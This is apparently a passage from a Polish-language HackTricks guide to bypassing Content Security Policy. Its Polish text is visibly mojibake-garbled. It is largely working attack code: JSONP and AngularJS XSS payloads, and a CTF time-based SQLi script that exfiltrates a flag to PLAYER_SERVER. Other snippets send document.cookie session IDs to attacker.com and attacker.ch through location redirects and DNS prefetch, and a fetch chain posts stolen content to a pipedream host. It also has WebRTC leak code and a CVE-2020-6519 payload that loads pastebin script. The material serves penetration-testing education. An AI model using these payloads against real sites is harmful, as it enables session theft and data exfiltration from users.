### AngularJS i dozwolona domena
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Polityka CSP, ktÃ³ra zezwala na Å‚adowanie skryptÃ³w z okreÅ›lonych domen w aplikacji Angular JS, moÅ¼e byÄ‡ obejÅ›ciem poprzez wywoÅ‚anie funkcji zwrotnych i niektÃ³rych podatnych klas. Dalsze informacje na temat tej techniki moÅ¼na znaleÅºÄ‡ w szczegÃ³Å‚owym przewodniku dostÄ™pnym w tym [repozytorium git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).

DziaÅ‚ajÄ…ce Å‚adunki:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Inne punkty koÅ„cowe do dowolnego wykonania JSONP moÅ¼na znaleÅºÄ‡ [**tutaj**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (niektÃ³re z nich zostaÅ‚y usuniÄ™te lub naprawione)

### OminiÄ™cie przez Przekierowanie

Co siÄ™ dzieje, gdy CSP napotyka przekierowanie po stronie serwera? JeÅ›li przekierowanie prowadzi do innego pochodzenia, ktÃ³re nie jest dozwolone, nadal zakoÅ„czy siÄ™ niepowodzeniem.

JednakÅ¼e, zgodnie z opisem w [specyfikacji CSP 4.2.2.3. ÅšcieÅ¼ki i Przekierowania](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), jeÅ›li przekierowanie prowadzi do innej Å›cieÅ¼ki, moÅ¼e obejÅ›Ä‡ oryginalne ograniczenia.

Oto przykÅ‚ad:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
JeÅ›li CSP jest ustawione na `https://www.google.com/a/b/c/d`, poniewaÅ¼ Å›cieÅ¼ka jest brana pod uwagÄ™, zarÃ³wno skrypty `/test`, jak i `/a/test` bÄ™dÄ… blokowane przez CSP.

JednakÅ¼e, ostateczne `http://localhost:5555/301` bÄ™dzie **przekierowane po stronie serwera na `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. PoniewaÅ¼ jest to przekierowanie, **Å›cieÅ¼ka nie jest brana pod uwagÄ™**, a **skrypt moÅ¼e byÄ‡ zaÅ‚adowany**, co omija ograniczenie Å›cieÅ¼ki.

DziÄ™ki temu przekierowaniu, nawet jeÅ›li Å›cieÅ¼ka jest caÅ‚kowicie okreÅ›lona, nadal bÄ™dzie omijana.

Dlatego najlepszym rozwiÄ…zaniem jest upewnienie siÄ™, Å¼e strona internetowa nie ma Å¼adnych luk w przekierowaniach oraz Å¼e nie ma domen, ktÃ³re mogÄ… byÄ‡ wykorzystane w reguÅ‚ach CSP.

### OminiÄ™cie CSP z wiszÄ…cym znacznikiem

Przeczytaj [jak tutaj](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; przez XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` oznacza, Å¼e moÅ¼esz wykonaÄ‡ dowolny skrypt w kodzie (XSS moÅ¼e wykonaÄ‡ kod), a `img-src *` oznacza, Å¼e moÅ¼esz uÅ¼ywaÄ‡ na stronie internetowej dowolnego obrazu z dowolnego ÅºrÃ³dÅ‚a.

MoÅ¼esz obejÅ›Ä‡ ten CSP, eksfiltrujÄ…c dane za pomocÄ… obrazÃ³w (w tej sytuacji XSS naduÅ¼ywa CSRF, gdzie strona dostÄ™pna dla bota zawiera SQLi, i wyciÄ…ga flagÄ™ za pomocÄ… obrazu):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

MoÅ¼esz rÃ³wnieÅ¼ naduÅ¼yÄ‡ tej konfiguracji, aby **zaÅ‚adowaÄ‡ kod javascript wstawiony w obraz**. JeÅ›li na przykÅ‚ad strona pozwala na Å‚adowanie obrazÃ³w z Twittera. MoÅ¼esz **stworzyÄ‡** **specjalny obraz**, **przesÅ‚aÄ‡** go na Twittera i naduÅ¼yÄ‡ "**unsafe-inline**", aby **wykonaÄ‡** kod JS (jak w przypadku zwykÅ‚ego XSS), ktÃ³ry **zaÅ‚aduje** **obraz**, **wyodrÄ™bni** **JS** z niego i **wykona** **go**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Z pracownikami serwisowymi

Funkcja **`importScripts`** pracownikÃ³w serwisowych nie jest ograniczona przez CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Wstrzykiwanie polityki

**Badania:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

JeÅ›li **parametr** wysÅ‚any przez Ciebie jest **wklejany wewnÄ…trz** **deklaracji** **polityki**, to moÅ¼esz **zmieniÄ‡** **politykÄ™** w taki sposÃ³b, aby **byÅ‚a bezuÅ¼yteczna**. MoÅ¼esz **zezwoliÄ‡ na skrypt 'unsafe-inline'** z dowolnym z tych obejÅ›Ä‡:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
PoniewaÅ¼ ta dyrektywa **nadpisze istniejÄ…ce dyrektywy script-src**.\
MoÅ¼esz znaleÅºÄ‡ przykÅ‚ad tutaj: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

W Edge jest to znacznie prostsze. JeÅ›li moÅ¼esz dodaÄ‡ w CSP tylko to: **`;_`** **Edge** **usunie** caÅ‚Ä… **politykÄ™**.\
PrzykÅ‚ad: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; via XSS (iframe) - Atak czasowy

ZauwaÅ¼ brak dyrektywy `'unsafe-inline'`\
Tym razem moÅ¼esz sprawiÄ‡, Å¼e ofiara **zaÅ‚aduje** stronÄ™ pod **twojÄ… kontrolÄ…** za pomocÄ… **XSS** z `<iframe`. Tym razem sprawisz, Å¼e ofiara uzyska dostÄ™p do strony, z ktÃ³rej chcesz wydobyÄ‡ informacje (**CSRF**). Nie moÅ¼esz uzyskaÄ‡ dostÄ™pu do zawartoÅ›ci strony, ale jeÅ›li w jakiÅ› sposÃ³b moÅ¼esz **kontrolowaÄ‡ czas, jaki strona potrzebuje na zaÅ‚adowanie**, moÅ¼esz wydobyÄ‡ potrzebne informacje.

Tym razem **flaga** zostanie wydobyta, gdy tylko **znak zostanie poprawnie odgadniÄ™ty** za pomocÄ… SQLi, **odpowiedÅº** zajmuje **wiÄ™cej czasu** z powodu funkcji sleep. NastÄ™pnie bÄ™dziesz mÃ³gÅ‚ wydobyÄ‡ flagÄ™:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Via Bookmarklets

Ten atak wymagaÅ‚by pewnego inÅ¼ynierii spoÅ‚ecznej, w ktÃ³rej atakujÄ…cy **przekonuje uÅ¼ytkownika do przeciÄ…gniÄ™cia i upuszczenia linku na zakÅ‚adkÄ™ przeglÄ…darki**. Ta zakÅ‚adka zawieraÅ‚aby **zÅ‚oÅ›liwy kod javascript**, ktÃ³ry po przeciÄ…gniÄ™ciu lub klikniÄ™ciu byÅ‚by wykonywany w kontekÅ›cie bieÅ¼Ä…cego okna przeglÄ…darki, **omijajÄ…c CSP i pozwalajÄ…c na kradzieÅ¼ wraÅ¼liwych informacji** takich jak ciasteczka lub tokeny.

Aby uzyskaÄ‡ wiÄ™cej informacji, [**sprawdÅº oryginalny raport tutaj**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP bypass by restricting CSP

W [**tym opisie CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP jest omijany przez wstrzykniÄ™cie wewnÄ…trz dozwolonego iframe bardziej restrykcyjnego CSP, ktÃ³re zabraniaÅ‚o Å‚adowania konkretnego pliku JS, ktÃ³ry nastÄ™pnie, poprzez **zanieczyszczenie prototypu** lub **dom clobbering**, pozwalaÅ‚ na **wykorzystanie innego skryptu do zaÅ‚adowania dowolnego skryptu**.

MoÅ¼esz **ograniczyÄ‡ CSP iframe** za pomocÄ… atrybutu **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

W [**tym opisie CTF**](https://github.com/aszx87410/ctf-writeups/issues/48) moÅ¼liwe byÅ‚o poprzez **wstrzykiwanie HTML** **ograniczenie** bardziej **CSP**, co spowodowaÅ‚o, Å¼e skrypt zapobiegajÄ…cy CSTI zostaÅ‚ wyÅ‚Ä…czony, a zatem **vulnerability staÅ‚a siÄ™ wykonalna.**\
CSP moÅ¼na uczyniÄ‡ bardziej restrykcyjnym, uÅ¼ywajÄ…c **tagÃ³w meta HTML**, a skrypty inline moÅ¼na wyÅ‚Ä…czyÄ‡ **usuwajÄ…c** **wejÅ›cie**, pozwalajÄ…c na ich **nonce** i **wÅ‚Ä…czajÄ…c konkretny skrypt inline za pomocÄ… sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### JS exfiltracja z Content-Security-Policy-Report-Only

JeÅ›li uda ci siÄ™ sprawiÄ‡, Å¼e serwer odpowie nagÅ‚Ã³wkiem **`Content-Security-Policy-Report-Only`** z **wartoÅ›ciÄ… kontrolowanÄ… przez ciebie** (moÅ¼e z powodu CRLF), moÅ¼esz skierowaÄ‡ go na swÃ³j serwer, a jeÅ›li **owiniesz** **treÅ›Ä‡ JS**, ktÃ³rÄ… chcesz wyeksfiltrowaÄ‡, w **`<script>`** i poniewaÅ¼ bardzo prawdopodobne, Å¼e `unsafe-inline` nie jest dozwolone przez CSP, to **wywoÅ‚a bÅ‚Ä…d CSP** i czÄ™Å›Ä‡ skryptu (zawierajÄ…ca wraÅ¼liwe informacje) zostanie wysÅ‚ana do serwera z `Content-Security-Policy-Report-Only`.

Dla przykÅ‚adu [**sprawdÅº ten opis CTF**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Leaking Information with CSP and Iframe

* Tworzy siÄ™ `iframe`, ktÃ³ry wskazuje na URL (nazwijmy go `https://example.redirect.com`), ktÃ³ry jest dozwolony przez CSP.
* Ten URL nastÄ™pnie przekierowuje do tajnego URL (np. `https://usersecret.example2.com`), ktÃ³ry jest **niedozwolony** przez CSP.
* SÅ‚uchajÄ…c zdarzenia `securitypolicyviolation`, moÅ¼na przechwyciÄ‡ wÅ‚aÅ›ciwoÅ›Ä‡ `blockedURI`. Ta wÅ‚aÅ›ciwoÅ›Ä‡ ujawnia domenÄ™ zablokowanego URI, wyciekajÄ…c tajnÄ… domenÄ™, do ktÃ³rej przekierowano poczÄ…tkowy URL.

InteresujÄ…ce jest to, Å¼e przeglÄ…darki takie jak Chrome i Firefox majÄ… rÃ³Å¼ne zachowania w obsÅ‚udze iframe'Ã³w w odniesieniu do CSP, co prowadzi do potencjalnego wycieku wraÅ¼liwych informacji z powodu nieokreÅ›lonego zachowania.

Inna technika polega na wykorzystaniu samego CSP do wydedukowania tajnego subdomeny. Metoda ta opiera siÄ™ na algorytmie wyszukiwania binarnego i dostosowywaniu CSP, aby uwzglÄ™dniÄ‡ konkretne domeny, ktÃ³re sÄ… celowo zablokowane. Na przykÅ‚ad, jeÅ›li tajna subdomena skÅ‚ada siÄ™ z nieznanych znakÃ³w, moÅ¼na iteracyjnie testowaÄ‡ rÃ³Å¼ne subdomeny, modyfikujÄ…c dyrektywÄ™ CSP, aby zablokowaÄ‡ lub zezwoliÄ‡ na te subdomeny. Oto fragment pokazujÄ…cy, jak CSP moÅ¼e byÄ‡ skonfigurowane, aby uÅ‚atwiÄ‡ tÄ™ metodÄ™:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
MonitorujÄ…c, ktÃ³re Å¼Ä…dania sÄ… blokowane lub dozwolone przez CSP, moÅ¼na zawÄ™ziÄ‡ moÅ¼liwe znaki w tajnej subdomenie, ostatecznie odkrywajÄ…c peÅ‚ny URL.

Obie metody wykorzystujÄ… niuanse implementacji i zachowania CSP w przeglÄ…darkach, pokazujÄ…c, jak pozornie bezpieczne polityki mogÄ… nieumyÅ›lnie ujawniaÄ‡ wraÅ¼liwe informacje.

Sztuczka z [**tutaj**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hackerami i Å‚owcami bÅ‚Ä™dÃ³w!

**WglÄ…d w Hacking**\
ZaangaÅ¼uj siÄ™ w treÅ›ci, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania zwiÄ…zane z hackingiem

**AktualnoÅ›ci Hackingowe w Czasie Rzeczywistym**\
BÄ…dÅº na bieÅ¼Ä…co z dynamicznie zmieniajÄ…cym siÄ™ Å›wiatem hackingu dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dom

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi nagrodami za bÅ‚Ä™dy oraz istotnymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hackerami juÅ¼ dziÅ›!

## Niebezpieczne Technologie do OminiÄ™cia CSP

### BÅ‚Ä™dy PHP przy zbyt wielu parametrach

Zgodnie z [**ostatniÄ… technikÄ… skomentowanÄ… w tym wideo**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), wysyÅ‚anie zbyt wielu parametrÃ³w (1001 parametrÃ³w GET, chociaÅ¼ moÅ¼na to rÃ³wnieÅ¼ zrobiÄ‡ z parametrami POST i wiÄ™cej niÅ¼ 20 plikami). KaÅ¼dy zdefiniowany **`header()`** w kodzie PHP **nie zostanie wysÅ‚any** z powodu bÅ‚Ä™du, ktÃ³ry to wywoÅ‚a.

### PrzeciÄ…Å¼enie bufora odpowiedzi PHP

PHP jest znane z **buforowania odpowiedzi do 4096** bajtÃ³w domyÅ›lnie. Dlatego, jeÅ›li PHP wyÅ›wietla ostrzeÅ¼enie, dostarczajÄ…c **wystarczajÄ…co duÅ¼o danych w ostrzeÅ¼eniach**, **odpowiedÅº** zostanie **wysÅ‚ana** **przed** **nagÅ‚Ã³wkiem CSP**, co spowoduje zignorowanie nagÅ‚Ã³wka.\
Technika polega zasadniczo na **wypeÅ‚nieniu bufora odpowiedzi ostrzeÅ¼eniami**, aby nagÅ‚Ã³wek CSP nie zostaÅ‚ wysÅ‚any.

PomysÅ‚ z [**tego opisu**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Przepisz stronÄ™ bÅ‚Ä™du

Z [**tego opisu**](https://blog.ssrf.kr/69) wyglÄ…da na to, Å¼e moÅ¼liwe byÅ‚o ominiÄ™cie ochrony CSP poprzez zaÅ‚adowanie strony bÅ‚Ä™du (potencjalnie bez CSP) i przepisanie jej treÅ›ci.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME to technika, ktÃ³ra wykorzystuje XSS (lub mocno ograniczone XSS) **w punkcie koÅ„cowym strony** do **wykorzystania** **innych punktÃ³w koÅ„cowych tej samej domeny.** Dzieje siÄ™ to poprzez zaÅ‚adowanie podatnego punktu koÅ„cowego z strony atakujÄ…cego, a nastÄ™pnie odÅ›wieÅ¼enie strony atakujÄ…cego do rzeczywistego punktu koÅ„cowego w tej samej domenie, ktÃ³ry chcesz wykorzystaÄ‡. W ten sposÃ³b **podatny punkt koÅ„cowy** moÅ¼e uÅ¼yÄ‡ obiektu **`opener`** w **Å‚adunku** do **dostÄ™pu do DOM** rzeczywistego **punktu koÅ„cowego do wykorzystania**. Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Ponadto, **wordpress** ma punkt koÅ„cowy **JSONP** w `/wp-json/wp/v2/users/1?_jsonp=data`, ktÃ³ry **odzwierciedli** **dane** wysÅ‚ane w odpowiedzi (z ograniczeniem do liter, cyfr i kropek).

AtakujÄ…cy moÅ¼e wykorzystaÄ‡ ten punkt koÅ„cowy do **wygenerowania ataku SOME** przeciwko WordPressowi i **osadziÄ‡** go w `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>`, zauwaÅ¼, Å¼e ten **skrypt** zostanie **zaÅ‚adowany**, poniewaÅ¼ jest **dozwolony przez 'self'**. Ponadto, poniewaÅ¼ WordPress jest zainstalowany, atakujÄ…cy moÅ¼e wykorzystaÄ‡ **atak SOME** poprzez **podatny** **punkt koÅ„cowy callback**, ktÃ³ry **obejmuje CSP**, aby daÄ‡ wiÄ™cej uprawnieÅ„ uÅ¼ytkownikowi, zainstalowaÄ‡ nowÄ… wtyczkÄ™...\
Aby uzyskaÄ‡ wiÄ™cej informacji na temat tego, jak przeprowadziÄ‡ ten atak, sprawdÅº [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

JeÅ›li istnieje surowa CSP, ktÃ³ra nie pozwala na **interakcjÄ™ z zewnÄ™trznymi serwerami**, istnieje kilka rzeczy, ktÃ³re zawsze moÅ¼esz zrobiÄ‡, aby wyekstrahowaÄ‡ informacje.

### Location

MoÅ¼esz po prostu zaktualizowaÄ‡ lokalizacjÄ™, aby wysÅ‚aÄ‡ do serwera atakujÄ…cego tajne informacje:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta tag

MoÅ¼esz przekierowaÄ‡, wstrzykujÄ…c tag meta (to jest tylko przekierowanie, to nie ujawnia treÅ›ci)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Aby Å‚adowaÄ‡ strony szybciej, przeglÄ…darki bÄ™dÄ… wstÄ™pnie rozwiÄ…zywaÄ‡ nazwy hostÃ³w na adresy IP i przechowywaÄ‡ je w pamiÄ™ci podrÄ™cznej do pÃ³Åºniejszego uÅ¼ycia.\
MoÅ¼esz wskazaÄ‡ przeglÄ…darkÄ™, aby wstÄ™pnie rozwiÄ…zaÅ‚a nazwÄ™ hosta za pomocÄ…: `<link rel="dns-prefetch" href="something.com">`

MoÅ¼esz naduÅ¼yÄ‡ tego zachowania, aby **wyekstrahowaÄ‡ wraÅ¼liwe informacje za pomocÄ… zapytaÅ„ DNS**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Inny sposÃ³b:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Aby uniknÄ…Ä‡ tego, serwer moÅ¼e wysÅ‚aÄ‡ nagÅ‚Ã³wek HTTP:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
NajwyraÅºniej ta technika nie dziaÅ‚a w przeglÄ…darkach bez interfejsu (boty)
{% endhint %}

### WebRTC

Na kilku stronach moÅ¼na przeczytaÄ‡, Å¼e **WebRTC nie sprawdza polityki `connect-src`** CSP.

W rzeczywistoÅ›ci moÅ¼esz _leak_ informacje uÅ¼ywajÄ…c _Å¼Ä…dania DNS_. SprawdÅº ten kod:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Inna opcja:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Sprawdzanie polityk CSP online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Automatyczne tworzenie CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Odniesienia

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

â€‹

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hackerami i Å‚owcami bugÃ³w!

**WglÄ…d w hacking**\
ZaangaÅ¼uj siÄ™ w treÅ›ci, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania zwiÄ…zane z hackingiem

**AktualnoÅ›ci o hackingu w czasie rzeczywistym**\
BÄ…dÅº na bieÅ¼Ä…co z dynamicznym Å›wiatem hackingu dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dom

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº informowany o najnowszych programach bug bounty oraz istotnych aktualizacjach platform

**DoÅ‚Ä…cz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hackerami juÅ¼ dziÅ›!

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
